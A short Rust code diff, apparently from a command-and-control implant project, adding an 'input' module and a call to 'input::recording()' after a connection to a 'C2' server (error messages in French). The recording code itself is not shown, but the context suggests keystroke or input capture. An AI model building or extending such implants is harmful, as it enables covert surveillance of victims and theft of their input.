@@ -1,4 +1,5 @@
 mod connexion;
+mod input;
 
 #[tokio::main]
 async fn main() {
@@ -12,4 +13,6 @@ async fn main() {
 
         Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
     }
+
+    input::recording();
 }
